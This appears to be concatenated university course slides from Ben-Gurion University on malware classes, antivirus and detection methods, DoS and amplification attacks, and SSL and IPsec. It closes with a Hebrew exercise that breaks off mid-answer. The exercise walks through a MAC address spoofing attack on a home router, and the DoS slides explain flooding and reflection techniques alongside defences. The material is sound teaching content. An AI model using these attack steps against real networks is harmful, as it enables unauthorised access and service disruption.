Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai, Dr. Mordechai 
Guri
{elovici, shabtaia}@bgu.ac.il
gurim@post.bgu.ac.il
Spring, 2019
1
Malware
• Malware (MALicious softWARE) - a software designed to 
disrupt computer operation, delete files, gather sensitive 
information, commit fraud (e.g., clicks, premium numbers), gain 
unauthorized access to a computer system, use the computer for 
an attack 
2
Malware
“a program that is inserted into a system, 
usually covertly, with the intent of 
compromising the confidentiality, 
integrity, or availability of the victim’s 
data, applications, or operating system or 
otherwise annoying or disrupting the 
victim.” [NIST05] 
3
Malicious Software
• programs exploiting system or human 
vulnerabilities
– program fragments that need a host program
• e.g. viruses, logic bombs, and backdoors 
– independent self-contained programs
• e.g. worms, bots
– replicating or not
• sophisticated threat to computer systems
4
Malware Terminology
5
Malware Terminology
6
Malware Terminology
7
Classification of Malware
• Ransomware
• Fileless malware
• Bootkit
8
APT
9
Malware
10
• PC
• Smartphone
• IoT
• Cars
• Embedded systems
• SCADA
Classification of Malware
• propagation method - how it spreads or 
propagates to reach the desired targets
• action/payload - the actions or payloads it 
performs once a target is reached
• need a host program (parasitic code such 
as viruses) vs independent, self-contained 
programs (worms, Trojans, and bots)
• does not replicate (Trojans and spam e-
mail) vs does replicate (viruses and 
worms)
11
Types of Malicious Software 
(Malware)
• propagation mechanisms include:
– infection of existing content by viruses that is 
subsequently spread to other systems
– exploit of software vulnerabilities by worms or 
drive-by-downloads to allow the malware to 
replicate
– social engineering attacks that convince users 
to bypass security mechanisms to install 
Trojans or to respond to phishing attacks
12
Types of Malicious Software 
(Malware)
• payload actions performed by malware 
once it reaches a target system can 
include:
– corruption of system or data files
– theft of service/make the system a zombie
agent of attack as part of a botnet
– theft of information from the 
system/keylogging
– stealthing/hiding its presence on the 
system
13
Viruses
• piece of software that infects programs
– modifies them to include a copy of the virus
– replicates and goes on to infect other content
– easily spread through network environments
• when attached to an executable program a virus 
can do anything that the program is permitted
to do
– executes secretly when the host program is run
• specific to operating system and hardware
– takes advantage of their details and weaknesses
14
Virus Components
• Infection mechanism
– means by which a virus spreads or propagates
– also referred to as the infection vector
• Trigger
– event or condition that determines when the 
payload is activated or delivered
– sometimes known as a logic bomb
• Payload
– what the virus does (besides spreading)
– may involve damage or benign but noticeable 
activity
15
Virus Phases
• dormant phase
– virus is idle
– will eventually be activated 
by some event
– not all viruses have this 
stage
• propagation phase
– virus places a copy of itself 
into other programs or into 
certain system areas on 
the disk
– may not be identical to the 
propagating version
– each infected program will 
now contain a clone of the 
virus which will itself enter 
a propagation phase
• triggering phase
– virus is activated to 
perform the function for 
which it was intended
– can be caused by a variety 
of system events
• execution phase
– function is performed
– may be harmless or 
damaging
16
Overwriting
Target 
executable
Malware Malware
17
Prepending
Target 
executable
Malware
Malware
Infected 
executable
18
Appending
Target 
executable
Malware
Malware
Infected 
executable
19
Cavity
Target 
executable
Malware
Infected 
executable
Malware
Malware
Malware
20
Executable packers
• Commonly used by virus writers
• Can process wide range of files: Windows PE 
executables, DOS executables, DOS COM files...
• Functions: compress, encrypt, randomize 
(polymorphism), anti-debug techniques, add-junk, 
anti-VM…
Payload
Malware
Infected
executable
Packer
21
Virus Structure
22
Compression Virus Logic
23
Virus Classifications
classification by target
• boot sector infector
– infects a master boot record or 
boot record and spreads when a 
system is booted from the disk 
containing the virus
• file infector 
– infects files that the operating
system or shell considers to be 
executable
• macro virus
– infects files with macro or 
scripting code that is interpreted
by an application
• Memory
– dynamic memory
• multipartite virus
– infects files in multiple ways
Classification by concealment strategy
• encrypted virus
– a portion of the virus creates a random 
encryption key and encrypts the 
remainder of the virus
• stealth virus
– a form of virus explicitly designed to 
hide itself from detection by anti-virus 
software
• polymorphic virus
– a virus that mutates with every 
infection
• metamorphic virus
– a virus that mutates and rewrites 
itself completely at each iteration and 
may change behavior as well as 
appearance
25
26
Macro/Scripting Code Viruses
• common in mid-1990s
– platform independent
– infect documents (not executable portions of code)
– easily spread
• exploit macro capability of MS Office
applications
– more recent releases of products
include protection
• various anti-virus programs have been
developed so these are no longer the
predominant virus threat
27
E-Mail Viruses
• more recent development
• e.g. Melissa
– exploits MS Word macro in attached doc
– if attachment opened, macro activates
– sends email to all on users address list
– and does local damage
• hence much faster propagation
28
Worms
• program that actively seeks out more machines to infect and 
each infected machine serves as an automated launching pad for 
attacks on other machines
– exploits software vulnerabilities in client or server programs
– can use network connections to spread from system to system
– spreads through shared media (USB drives, CD, DVD data disks)
– e-mail worms spread in macro or script code included in 
attachments and instant messenger file transfers
• upon activation the worm may replicate and propagate again 
• usually carries some form of payload
• first known implementation was done in Xerox 
Palo Alto Labs in the early 1980s
• Morris Worm 1988
29
Worm Replication
• electronic mail or instant messenger facility
– worm e-mails a copy of itself to other systems
– sends itself as an attachment via an instant 
message service
• file sharing
– creates a copy of itself or infects a file as a virus 
on removable media
• remote execution capability
– worm executes a copy of itself on another system
• remote file access or transfer capability
– worm uses a remote file access or transfer service 
to copy itself from one system to the other
30
Worm Propagation Model
31
Known Worm Attacks
32
SQL Slammer
33
Mobile Code
• programs that can be shipped unchanged 
to a variety of platforms
• transmitted from a remote system to a 
local system and then executed on the 
local system
• often acts as a mechanism for a virus, 
worm, or Trojan horse
• takes advantage of vulnerabilities to 
perform it own exploits
• popular vehicles include Java applets, 
ActiveX, JavaScript and VBScript
34
Mobile Phone Malware
• first discovery was Cabir worm in 2004
• then Lasco and CommWarrior in 2005
• communicate through Bluetooth wireless 
connections or MMS
• target is the smartphone
• can completely disable the phone, delete data 
on the phone, or force the device to send costly 
messages
• CommWarrior replicates by means of Bluetooth 
to other phones, sends itself as an MMS file to 
contacts and as an auto reply to incoming text 
messages
35
Mobile Phone Malware
36
Drive-By-Downloads
• exploits browser vulnerabilities to 
download and install malware on the 
system when the user views a Web page 
controlled by the attacker
• in most cases does not actively propagate
• spreads when users visit the malicious 
Web page
37
Social Engineering
• “tricking” users to assist in the compromise of 
their own systems
• spam
– unsolicited bulk e-mail
– significant carrier of malware
– used for phishing attacks
• Trojan horse
– program or utility containing harmful hidden code
– used to accomplish functions that the attacker could 
not accomplish directly
• mobile phone Trojans
– first appeared in 2004 (Skuller)
– target is the smartphone
38
Payload System Corruption
• data destruction
– Chernobyl virus
• first seen in 1998 
• Windows 95 and 98 virus
• infects executable files and corrupts the entire file system when a 
trigger date is reached
– Klez
• mass mailing worm infecting Windows 95 to XP systems
• on trigger date causes files on the hard drive to become empty
– ransomware
• encrypts the user’s data and demands payment in order to access 
the key needed to recover the information
• PC Cyborg Trojan (1989)
• Gpcode Trojan (2006)
• WannaCry (2017)
39
Payload System Corruption
• real-world damage
– causes damage to physical equipment
• Chernobyl virus rewrites BIOS code
– Stuxnet worm
• targets specific industrial control system software
• there are concerns about using sophisticated 
targeted malware for industrial sabotage
– logic bomb: code embedded in the malware 
that is set to “explode” when certain 
conditions are met
40
Botnets
• Bots – a malicious software that runs 
autonomously and automatically on a 
compromised computer (zombie) without 
owner’s consent to perform some 
malicious/disturbing activity; e.g., SPAM, 
DoS…
• Botnet (Bot army) – controlled by a master 
via some Command & Control (C&C) channel
41
Botnets
• takes over another Internet attached computer and uses 
that computer to launch or manage attacks
• botnet - collection of bots capable of acting in a 
coordinated manner
• uses:
– distributed denial-of-service (DDoS) attacks
– spamming
– sniffing traffic
– keylogging
– spreading new malware
– installing advertisement add-ons and browser helper objects 
(BHOs)
– attacking IRC chat networks
– manipulating online polls/games
42
Remote control
• distinguishes a bot from a worm 
• worm propagates itself and activates itself
• bot is initially controlled from some central facility
• previous typical means of implementing the 
remote control facility is on an IRC server
• bots join a specific channel on this server and treat 
incoming messages as commands
• more recent botnets use covert communication 
channels via protocols such as HTTP
• distributed control mechanisms use peer-to-peer 
protocols to avoid a single point of failure
43
Remote Control Facility
• Encrypted services
• DNS
• Websites
• Bridging airgap
44
Payload – Information Theft
Keyloggers and Spyware
• Keylogger
– captures keystrokes to allow attacker to monitor 
sensitive information
– typically uses some form of filtering mechanism that 
only returns information close to keywords (“login”, 
“password”)
• Spyware
– subverts the compromised machine to allow monitoring 
of a wide range of activity on the system
– monitoring history and content of browsing activity
– redirecting certain Web page requests to fake sites
– dynamically modifying data exchanged between the 
browser and certain Web sites of interest
45
Payload – Information Theft
Phishing
• exploits social engineering to leverage the user’s trust by 
masquerading as communication from a trusted source
– include a URL in a spam e-mail that links to a fake Web site 
that mimics the login page of a banking, gaming, or similar 
site
– suggests that urgent action is required by the user to 
authenticate their account
– attacker exploits the account using the captured credentials
• spear-phishing
– recipients are carefully researched by the attacker
– e-mail is crafted to specifically suit its recipient, often 
quoting a range of information to convince them of its 
authenticity
46
Payload – Stealthing
Backdoor
• also known as a trapdoor
• secret entry point into a program 
allowing the attacker to gain access and 
bypass the security access procedures
• maintenance hook is a backdoor used by 
programmers to debug and test 
programs
• difficult to implement operating system                          
controls for backdoors in applications
47
Payload - Stealthing
Rootkit
• stealth software component that maintains a 
persistent and undetectable presence on the 
machine
• set of hidden programs installed on a system to 
maintain covert access to that system 
• hides by subverting the mechanisms that monitor 
and report on the processes, files, and registries on 
a computer
• gives administrator (or root) privileges to attacker
– can add or change programs and files, monitor 
processes, send and receive network traffic, and get 
backdoor access on demand
48
System Call Table Modification
49
Advances malware/attacks
51
Virus Countermeasures
• ideal solution to the threat of malware is 
prevention
• four main elements of prevention:
– policy
– awareness
– vulnerability mitigation
– threat mitigation
• prevention fails, technical mechanisms can be used 
to support the following threat mitigation options:
– detection
– identification
– removal
52
Anti-Virus Evolution
• virus & antivirus tech have both evolved
• early viruses simple code, easily removed
• as become more complex, so must the 
countermeasures
• generations
– first - signature scanners
– second - heuristics
– third - identify actions
– fourth – full featured solution
53
Generic Decryption
• runs executable files through GD scanner:
– CPU emulator to interpret instructions
– virus scanner to check known virus signatures
– emulation control module to manage process
• lets virus decrypt itself in interpreter
• periodically scan for virus signatures
• issue is long to interpret and scan
– tradeoff chance of detection vs time delay
55
Behavior-Blocking Software
56
Host-Based Behavior-Blocking 
Software
• integrates with the operating system of a host 
computer and monitors program behavior in real 
time for malicious action 
– blocks potentially malicious actions before they 
have a chance to affect the system
– blocks software in real time so it has an advantage 
over anti-virus detection techniques such as 
fingerprinting or heuristics
• limitations
– because malicious code must run on the target 
machine before all its behaviors can be identified, 
it can cause harm before it has been detected and 
blocked
57
Detection techniques
• Integrity check
• Static analysis
– Signature-based
– Behavioral analysis
• Dynamic behavioral analysis
• Reputation of files
60
Reputation-based
61
Static analysis
• Leverage structural information (e.g., sequence 
of bytes)
• Attempts to detect malware before the 
program under inspection executes
• Information about the program or its expected 
behavior consists of explicit and implicit 
observations in its binary/source code
• Implemented using the signature-based method
which relies on the identification of unique 
strings in the binary code
– useless against unknown malicious code
• Behavioral/Heuristic static analysis
62
Dynamic analysis
• leverage  runtime information (e.g., network 
usage, files and memory modifications, system 
calls)
• attempts to detect malicious behavior during 
program execution or after program execution
• Difficult to simulate the appropriate conditions 
in which the malicious functions of the program, 
such as the vulnerable application that the 
malware exploits, will be activated
• It is not clear what is the required period of 
time needed to observe the appearance of the 
malicious activity for each malware
63
Goals
• Clean network traffic from known malware
• Clean network traffic from unknown malware
• Detect malware at the host
• Rank unknown files by level of suspicion
• Generate unique signature – automatic 
signature generation (ASG)
64
On the effectiveness of malware 
protection on Android
65
Static analysis
Portable Executable (PE) data
• Windows OS Portable Executable
– File format for executables, object code, sys drivers, DLLs
– Contains information necessary for the Windows OS loader to 
manage the executable code
• Data is extracted from certain parts of .exe files stored in 
Win32 PE binaries
• PE Header that describes physical structure of a PE binary (e.g., 
creation/modification time, machine type, file size)
– Import Section: which DLLs were imported and which functions 
from which imported DLLs were used
– Exports Section: which functions were exported (if the file being 
examined is a DLL)
– Resource Directory: resources used by a given file (e.g., pics)
– Version Information (e.g., internal and external name of a file, 
version number)
66
Static analysis
Portable Executable (PE) data
67
Malware code detection as text 
categorization (opcode n-grams)
• Disassembles executables into assembly 
instructions (e.g., by using IDA-Pro)
• Creates sequences (n-grams) of operation 
codes
Shabtai et al, Detecting Unknown Malicious Code by 
Applying Classification Techniques on OPCODEs 
Representation, Security Informatics, 2012
69
Malware code detection as text 
categorization opcode n-grams
70
Static analysis
Strings
• String features are based on plain-text strings 
that are encoded in programs files
• Examples: “windows”, “kernel”, “reloc” etc)
• Possibly can also be used to represent files 
similarly to the text categorization problem
• May reveal useful information: IRC Commands, 
SMTP commands, registry keys
71
Detection Using Machine 
Learning
72
File 55 8B EC E4 F8 81 … 3F 01 0F Class
File1 1 1 0 Benign
File2 1 0 0 Benign
… …
0 0 1 Malware
Filen 0 1 1 Malware
Basic dynamic analysis
• Sandboxes
– Run in an isolated virtual environment
– Various flavors with various features
– Users’ PCs
• Virtual machines
– Pretty safe if no network connection
– Can also generate fake networks
– Snapshots
• Honeypots
– Carefully control all traffic through a honeywall
73
Malware signatures classification
• Vulnerability-based signature
– describes the properties of a certain bug in the system
– do not attempt to detect every malicious code
– can be very effective when dealing with polymorphic malware
– can be generated only when the vulnerability is discovered
• Exploit-based signature
– describes a piece of code (sequence of commands or inputs) 
triggered by the malware which actually exploits a 
vulnerability in the system
– usually focus on analyzing similarities in network traffic or 
sequence of commands
• Payload-based signatures
– actual body of the malware
74
Virus Scanners and Signatures
• Common AV identify the presence of a virus in an exe 
file, a boot record or memory by using short 
signatures which consist of sequences of bytes 
• Good signature
– Found in every object infected by the virus
– Unlikely to be found if the virus is not present
• Typically, a human expert chooses a signature for a 
new virus by means of a time consuming procedure
– Converting the binary code of the virus to Assembler
– Analyzing the assembler code and picking sections of code 
that appear to be unusual
– Identifying the corresponding bytes in the machine code
75
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Network\CompNetSec9_Network.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (3-721-460-1)
Denial of Service Attack
Dept. of Software and Information Systems 
Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2019
Denial-0f-Service (DoS) Attack
“an action that prevents or impairs the 
authorized use of networks, systems, or 
applications by exhausting resources such 
as central processing units (CPU), 
memory, bandwidth, and disk space.”
(NIST Computer Security Incident 
Handling Guide )
Denial-of-Service (DoS)
• Exhaustion vs. disruption
• network bandwidth
– capacity of the network links connecting a server to the Internet
– for most organizations this is their connection to their ISP
– Consuming network bandwidth with large volume of generated traffic
• system resources
– aims to overload or crash the network handling software (e.g. protocol)
– specific packets are sent and consume the limited resources available
• SYN Spoofing attack  - Table of TCP connections on the server
• application resources
– involves a number of valid requests, each of which consumes significant 
resources, thus limiting the ability of the server to respond to requests 
from other users
• CyberSlam – large & costly queries - severely load the Web-server’s DB
Classic Denial of Service Attacks
• can use simple flooding ping command
• attacker generates higher volume of 
traffic from higher capacity network 
connection to lower capacity network 
connection which cannot handle these 
volumes of traffic
• cause loss of traffic
• source of the attack is clearly identified 
unless a spoofed address is used
Internet Control Message 
Protocol (ICMP)
• An error reporting and diagnostic utility
• Used by routers, intermediary devices, or hosts to 
communicate updates or error information to other 
routers, or hosts
• ICMP message contains three fields:
– TYPE - identifies the ICMP message
– CODE - further information about the
associated TYPE field
– CHECKSUM - a method for determining the
integrity of the message
Message types:
0: Echo replay
1-2: Unassigned
3: Destination unreachable
4: Source quench
5: Redirected
7: Unassigned
8: Echo Request
11: Time exceeded
13: Timestamp Request
14: Timestamp reply
15: Information request
16: Information replay
ICMP, UDP and OSI
ICMP
UDP
Flooding Attacks
• ICMP flood
– echo request ("ping") is an ICMP message whose data is 
expected to be received back in an echo reply ("pong")
– host must respond to all echo requests with an echo reply 
containing the exact data received in the request message
– attacker sends large number of ICMP echo request packets 
and creates a ping flood
– traditionally network administrators allow such packets enter 
into their networks because ping is a useful network 
diagnostic tool
• UDP flood (User Datagram Protocol)
– uses UDP packets directed to some port number on the 
target system
– as a result, the target system replies with 
an ICMP Destination Unreachable packet (Type = 3)
Source Address Spoofing
• use forged source addresses - usually via the raw socket 
interface on operating systems
– used for custom network testing and still maintained in many 
current OS
• generates large volumes of packets that have the target system 
as the destination address
• different random source address
• responses are scattered across Internet; real source is much 
harder to identify
• backscatter traffic 
– no real system will send legitimate response packets to unused IP 
address
– more likely that these IP addresses are spoofed and used for 
attack
– security researchers advertise routes to unused IP addresses to 
monitor attack traffic
SYN flooding/Clogging
• attacks the ability of a server to respond to future 
TCP connection requests by overflowing the tables 
(allocated state, TCP buffers) used to manage them
– SYN_RCVD , ESTABLISHED
• thus legitimate users are 
denied access to the server
• hence an attack on system 
resources, specifically the 
network handling code in 
the operating system
• use spoofed src IP that will
not send RST (unused/blocked)
SYN flooding/Clogging - defense
• Block incoming TCP connections from 
external addresses to internal servers
• Quota per IP
• Remove “half-open”/outdated 
connections under load periods
• Allocate resources only after ACK
• SYN cookies (client seq#, time, MAC on 
src, dest IP address, port and time)
– no need to keep state
Other attacks
• TCP connection flooding attack
– establish full TCP connection from valid IPs
• HTTP-based attacks – HTTP flood
– attack that bombards Web servers with 
HTTP requests; consumes considerable 
resources
– spidering - bots starting from a given HTTP 
link and following all links on the provided 
Web site in a recursive way
More DoS attacks
• attacks on mobile devices (battery)
• data availability
• “heavy” legitimate operations
• buffer overflow
– Remotely crashes a vulnerable system by 
sending more traffic to a application than it 
was designed to handle
DDoS Attack Architecture
Distributed Denial of Service 
DDoS Attacks
• Tribe Flood Network (TFN), TFN2K
– written by aknown hacker named Mixter
– ICMP flooding, SYN flooding, UDP flooding
– Unix, Solaris, Windows NT
– Opened shell in every agent for running handler program 
• Trinoo
– UDP flooding
– Trinoo is famous for allowing attackers to leave a message in 
a folder called cry_baby
– The file is self replicating and is modified on a regular basis 
as long as port 80 is active
• Stacheldraht
– Combines features of TFN and Trinoo
– Adds encrypted communication
Dyn DDoS Attack (Oct. 2016)
• multiple DDoS attacks targeting systems operated 
by Domain Name System (DNS) provider Dyn
• the attack was accomplished through a large 
number of DNS lookup requests from tens of 
millions of 
IP addresses
• executed through 
the Mirai botnet 
consisting of a large
number of infected 
IoTs such as printers, 
IP cameras, gateways 
and baby monitors
6/5/201916
Reflection Attacks
• use normal behavior of network and not “Zombies”
• attacker sends packets to a known service on the 
intermediary (e.g., server) with a spoofed source 
address of the actual target system
• when intermediary responds, the response is sent 
to the target
• “reflects” the attack off the intermediary 
(reflector)
• goal is to generate enough volumes of packets to 
flood the link to the target system without alerting 
the intermediary
• the basic defense against these attacks is blocking 
spoofed-source packets
Reflection Attacks
• further variation creates a self-
contained loop between intermediary 
and target
• fairly easy to filter and block
Amplification Attacks
• Smurf (ICMP Packet Magnification) 
attack
– the attacker sends an ICMP echo request 
(ping) to a broadcast address with the 
victim’s source address
DNS Amplification Attacks
• use packets directed at a legitimate DNS server as the 
intermediary system
• attacker creates a series of DNS requests containing the 
spoofed source address of the target system
• exploit DNS behavior to convert a small request to a much 
larger response (amplification)
• 60 byte request to 512 - 4000 byte response
• target is flooded with responses
• basic defense against this attack is to prevent the use of 
spoofed source addresses
DoS Attack Defenses
• these attacks cannot be prevented entirely
• high traffic volumes may be legitimate 
(popular Web-sites, release of new 
product…)
• prevention – before attack
• detection and filtering (during)
• traceback (during and after)
• reaction (after)
DoS Attack Prevention
• block spoofed source addresses
– on routers as close to source as possible
– filters may be used to ensure path back to the claimed 
source address is the one being used by the current packet
• e.g. using Cisco routers command: “ip verify unicast reverse-path“
• filters must be applied to traffic before it leaves the ISP’s network 
or at the point of entry to their network
• use modified TCP connection handling code
– cryptographically encode critical information in a cookie that 
is sent as the server’s initial sequence number
• legitimate client responds with an ACK packet containing the 
incremented sequence number cookie
– drop an entry for an incomplete connection from the TCP 
connections table when it overflows
DoS Attack Prevention
• block IP directed broadcasts (against 
amplifications)
• limit or block traffic from and into suspicious 
services and combinations (hostile origin, low 
reputation ip - alexa)
• manage application attacks with a form of 
graphical puzzle (captcha) to distinguish 
legitimate human requests
• ideally have network monitors and IDS to 
detect and notify abnormal traffic patterns
• use mirrored and replicated servers when high-
performance and reliability is required
Responding to DoS Attacks
• identify type of attack
– capture and analyze packets 
– design filters to block attack traffic upstream
– or identify and correct system/application bug
• have ISP trace packet flow back to source
– may be difficult and time consuming
– necessary if planning to report it the attack to law 
enforcement agencies.
• implement contingency plan
– switch to alternate backup servers
– Set new servers at a new site with new addresses
• update incident response plan
– analyze the attack and the response for future handling
Computer & Information Security (3-721-460-1)
Security protocols
Dept. of Software and Information Systems 
Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2018
6/5/201925
Application layer security 
protocols
• Confidentiality, Integrity, Non-
repudiation, Reply, authentication 
(application layer)
• End-to-end
• Routing and firewall screening is not 
affected
• Cannot protect against attacks (e.g., Syn
attack)
• Updating the application is required
• Examples: PGP, SSH
6/5/201926
Network layer security protocols
• Confidentiality, Integrity, Reply, 
authentication (IP level)
• End-to-end / gateway-to-gateway
• Routing is not affected
• Affects firewall screening 
• Protects against attack at the transport 
layer (e.g., Syn attack)
• Transparent to the application 
• Examples: IPSec
6/5/201927
Transport layer security 
protocols
• Confidentiality, Integrity, Reply, 
authentication 
• End-to-end
• Routing and firewall screening is not 
affected
• Cannot protect against attacks (e.g., Syn
attack)
• Transparent to the application 
• Examples: SSL/TSL
6/5/201928
Secure Sockets Layer (SSL)
• one of the most widely used security services 
• transport layer security service - originally 
developed by Netscape
• general-purpose service implemented as a set 
of protocols that rely on TCP
• use TCP to provide a reliable end-to-end service
• subsequently became Internet standard 
RFC2246: Transport Layer Security (TLS)
• may be provided in underlying protocol suite
• or embedded in specific packages
SSL Protocol Stack
SSL Record Protocol Services
• message integrity
– using a MAC with shared secret key
– similar to HMAC but with different padding
• confidentiality
– using symmetric encryption with a shared 
secret key defined by Handshake Protocol
– AES, IDEA, RC2-40, DES-40, DES, 3DES, 
Fortezza, RC4-40, RC4-128
– message is compressed before encryption
SSL Record Protocol Operation
SSL Change Cipher Spec Protocol
• one of three SSL specific protocols 
that use the SSL Record Protocol (the 
simplest)
• consists of a single message which 
consists of a single byte with the value 1
• sole purpose of this message is to cause 
pending state to be copied into the 
current state
• hence updating the cipher suite in use
SSL Alert Protocol
• conveys SSL-related alerts to peer entity
• two bytes message: first byte indicating the 
severity of message - warning (1) or fatal (2); 
second byte contains a code that indicates the 
specific alert
• specific alert
– Fatal (results in immediate termination of the SSL 
connection): unexpected message, bad record mac, 
decompression failure, handshake failure, illegal 
parameter
– warning: close notify, no certificate, bad certificate, 
unsupported certificate, certificate revoked, 
certificate expired, certificate unknown
• compressed & encrypted like all SSL data
SSL Handshake Protocol
• is used before any application data are 
transmitted
• allows server & client to:
– authenticate each other
– to negotiate encryption & MAC algorithms
– to negotiate cryptographic keys to be used
• comprises a series of messages in phases
– Establish Security Capabilities
– Server Authentication and Key Exchange
– Client Authentication and Key Exchange
– Finish
SSL 
Handshake 
Protocol
SMUCSE 5349/734937
Generating the Master Secret
SOURCE: THOMAS, SSL AND TLS ESSENTIALS
SERVER’S PUBLIC KEY
IS SENT BY SERVER IN
ServerKeyExchange
CLIENT GENERATES THE
PREMASTER SECRET
ENCRYPTS WITH PUBLIC
KEY OF SERVER
CLIENT SENDS PREMASTER
SECRET IN ClientKeyExchange
SENT BY CLIENT
IN ClientHello
SENT BY SERVER
IN ServerHello
MASTER SECRET IS 3 MD5
HASHES CONCATENATED
TOGETHER = 384 BITS
SMUCSE 5349/734938
Generation of Key Material 
SOURCE: THOMAS, SSL AND TLS ESSENTIALS
JUST LIKE FORMING
THE MASTER SECRET
EXCEPT THE MASTER
SECRET IS USED HERE
INSTEAD OF THE
PREMASTER SECRET
. . .
SMUCSE 5349/734939
Obtaining Keys from the Key Material
SOURCE: THOMAS, SSL AND TLS ESSENTIALS
SECRET VALUES
INCLUDED IN MESSAGE
AUTHENTICATION CODES
INITIALIZATION VECTORS
FOR DES CBC ENCRYPTION
SYMMETRIC KEYS
HTTPS (HTTP over SSL)
• combination of HTTP and SSL to implement 
secure communication between a Web browser 
and a Web server
• built into all modern Web browsers
– search engines do not support HTTPS
– URL addresses begin with https://
– documented in RFC 2818, HTTP Over TLS
– agent acting as the HTTP client also acts as the 
TLS client
– closure of an HTTPS connection requires that TLS 
close the connection with the peer TLS entity on 
the remote side, which will involve closing the 
underlying TCP connection
IP Security (IPsec)
• various application security mechanisms
– S/MIME, PGP, Kerberos, SSL/HTTPS
• security concerns cross protocol layers
• would like security implemented by the 
network for all applications
• authentication and encryption security 
features included in next-generation 
IPv6
• also usable in existing IPv4
IPsec
• general IP security mechanisms
• provides the capability to secure 
communications across a LAN, across 
private and public WANs, and across 
the Internet
IPsec
• Authentication
– assures that a received packet was, in fact, 
transmitted by the party identified as the source in 
the packet header and that the packet has not been 
altered in transit
• Confidentiality
– enables communicating nodes to encrypt messages to 
prevent eavesdropping by third parties
• Integrity
• Protects against reply attack
• Access control
• Protect against Syn attack and session hijacking
IPSec Uses
Benefits of IPsec
• when implemented in a firewall or router, it 
provides strong security to all traffic 
crossing the perimeter
• in a firewall/router it is resistant to 
bypass
• below transport layer, hence transparent 
to applications
• can be transparent to end users
• can provide security for individual users
• secures routing architecture
IP Security Architecture
• have three main facilities:
– Authentication Header (AH)
– Encapsulating Security Payload (ESP)
– Key Management / Exchange function
• concerned with the secure exchange of keys
• provided by the Internet exchange standard IKEv2
• VPNs want both authentication/encryption
– hence usually use ESP
• specification is quite complex
– numerous RFC’s 2401/2402/2406/2408
Security Associations
• a one-way relationship between sender & 
receiver that affords security for traffic flow
• Stored in a database of Security Associations 
(SAD)
• Can be static (offline) and dynamic by the IKE 
protocol
• Defined by 3 parameters:
– Security Parameters Index (SPI)
– IP Destination Address
– Security Protocol Identifier
• has a number of other parameters
– seq no, AH & EH info, lifetime, mode, etc
Security Associations
Authentication Header (AH)
• provides support for data integrity & 
authentication of IP packets
– end system/router can authenticate 
user/app
– prevents address spoofing attacks by 
tracking sequence numbers
• based on use of a MAC
– HMAC-MD5-96 or HMAC-SHA-1-96
• parties must share a secret key
IPSec Header
6/5/201950
Authentication Header
Encapsulating Security Payload 
(ESP)
Key Management
• handles key generation & distribution
• typically need 2 pairs of keys
– 2 per direction for AH & ESP
• manual key management
– sysadmin manually configures every system
• automated key management
– automated system for on demand creation 
of keys for SA’s in large systems
– has Oakley & ISAKMP elements
Transport and Tunnel Modes
• transport mode protection 
extends to the payload of an 
IP packet
• typically used for end-to-end 
communication between two 
hosts
• ESP in transport mode 
encrypts and optionally 
authenticates the IP payload 
but not the IP header
• tunnel mode provides 
protection to the entire IP 
packet
• the entire original packet 
travels through a tunnel from 
one point of an IP network to 
another
• used when one or both ends 
of a security association are 
a security gateway such as a 
firewall or router that 
implements IPsec
• with tunnel mode a number of 
hosts on networks behind 
firewalls may engage in 
secure communications 
without implementing IPsec
http://www.tcpipguide.com/free/t_IPSecModesTransportandTunnel.htm
IPSec Transport Mode: IPSEC instead of IP header
IPSec Tunnel Mode: IPSEC header + IP header 
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\QAs\PS-13---Recap.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information 
Security
1
PRACTICAL SESSION NO. 13
RECAP
1תרגיל 
דוד הינו טכנאי בזק אשר הוזמן לביתך להתקין נתב אלחוטי•
 MAF)Mac Address Filtering)-הנתב תומך ב•
10.0.0.138בכתובת WEBי ממשק "ניהול הנתב מתבצע ע•
:באופן הבאMAF-בכדי להגן על הרשת מפני אורחים לא רצויים דוד השתמש במנגנון ה•
o הגבלת הגישה לנתב לכתובותMACספציפיות
oי כתובת "הגבלת הגישה לממשק הניהול של הנתב למחשב ספציפי אשר מזוהה עMACספציפית
?מנה את שיטת ההתקפה אליה חשופה הרשת הביתית שלך•
?הצג תרחיש המתאר התקפה סבירה על הרשת•
? כיצד ניתן למנוע התקפות מסוג זה•
2
פתרון
:הרשת הביתית חשופה להתקפות הבאות•
oכניסה בלתי מורשת לרשֿת
oכניסה בלתי מורשת לממשק המנהל
MAC Address Spoofingשיטת ההתקפה היא •
o כתובת הMAC לצורכי אימות)אשר מאפיינת את כרטיס הרשת באופן ייחודיי איננה מקור מהימן)
o תוקף יכול בקלות לזייף את כתובת הMAC ולהזדהות ע״י כתובתMACהשונה מכתובת כרטיס הרשת שלו
:תרחיש ההתקפה הוא הבא•
oהתוקף מאזין לרשת ומחכה לכניסה של לקוח מורשה
o ברגע שלקוח מורשה מתחבר לרשת התוקף מזהה את כתובת הMACשל הלקוח
o התוקף משנה את כתובת הMAC שלו לכתובת הMACשל הלקוח המורשה
oהתוקף מתחבר לרשת
WPA-2לדוג׳ , בכדי למנוע את התקפה זו עלינו להשתמש במנגנון אימות•
3
2תרגיל 
ניתן בתשובתך ציין האם Packet Filtering Firewallהסבר בקצרה על •
של MACאש זו לבצע סינון של חבילה על בסיס כתובת ה -באמצעות חומת
השולח
Stateful-וStateless Firewallאת ההבדל העיקרי בין מנה • Firewall
וציין מאיזה סוג הואUnixאשר נמצא ב Firewallתן דוגמא ל •
4
פתרון
•Packet Filtering Firewall הוא מנגנון המאפשר סינון של חבילות רשת על
-IP-SRC(2 )IP-DST(3 )PORT-SRC(4 )PORT( 1: )בסיס המאפיינים הבאים
